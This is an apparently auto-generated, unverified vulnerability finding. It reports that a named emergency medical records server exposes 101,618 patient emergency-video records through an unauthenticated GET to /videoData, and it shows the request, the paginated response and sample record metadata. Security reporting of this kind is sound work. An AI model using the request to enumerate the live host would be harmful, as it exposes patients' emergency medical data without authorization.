# POC/EXP — Port 4001 /videoData unauthenticated bulk exposure of 101,618 emergency medical video records

> 漏洞ID: `9a655abd-eb2b-4664-9c2e-87d2bf2551d1`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4001/videoData`

**類型**: Broken Access Control / Unauthenticated Sensitive Data Exposure

## 描述

Port 4001 runs the EPCR "VitalSignVideoServer" (Node/Express). GET /videoData returns a 200 JSON array of emergency-video records with NO authentication (no token/cookie required). Each record contains patient emergency video metadata: id, recordUuid (dispatch UUID), fileName (e.g. [iPhone][tw.com.viewlead.emtapp...][uuid][timestamp].mp4), fileId, mimeType, generatedAt, and VideoType (現場影像 / 手機上傳 = on-scene / phone-upload). The Content-Range header confirms 101,618 total records. This is an unauthenticated bulk enumeration endpoint for a patient emergency-video record index, plus socket.io on the same host exposes access-control-allow-origin: * (wildcard CORS).

## POC / 復現步驟

```
Request:
GET /videoData HTTP/1.1
Host: epcr.tpf.gov.tw:4001
(no Authorization, no Cookie)

Response:
HTTP/1.1 200 OK
Content-Range: items 0-99/101618
Content-Type: application/json; charset=utf-8
Content-Length: 43451

Body (first records):
[{"id":2,"recordUuid":"180810145678","fileName":"[iPhone][tw.com.viewlead.emtapp9C372D5A-7431-471E-8135-A1163FC6A7BE][180810145678][20180814162050].mp4","fileId":107,"mimeType":"video/mp4","generatedAt":"2018-08-14T08:20:50.000Z","createdAt":"2018-08-14T08:47:02.000Z","VideoTypeId":1,"VideoType":{"id":1,"name":"手機上傳",...}},
{"id":100,"recordUuid":"Test18081618453537","fileName":"HeadCam_Test18081618453537_b956e612-....flv","fileId":205,"mimeType":"application/octet-stream",...,"VideoType":{"id":2,"name":"現場影像",...}}]

Pagination: Content-Range: items 0-99/101618 (100 records/page, 101,618 total, 1017 pages)
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
